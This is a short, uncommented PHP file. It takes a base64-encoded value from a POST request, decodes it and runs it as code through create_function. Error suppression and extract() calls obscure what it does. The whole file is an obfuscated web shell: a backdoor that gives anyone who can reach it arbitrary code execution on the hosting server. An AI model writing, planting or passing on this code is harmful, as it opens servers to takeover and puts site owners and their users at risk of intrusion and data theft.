<?php
@extract(array(result => create_function(NULL, fun())));
@extract(array(Name => $result()));
function fun() {
	$result = $_POST;
	return @(base64_decode($result[true]));}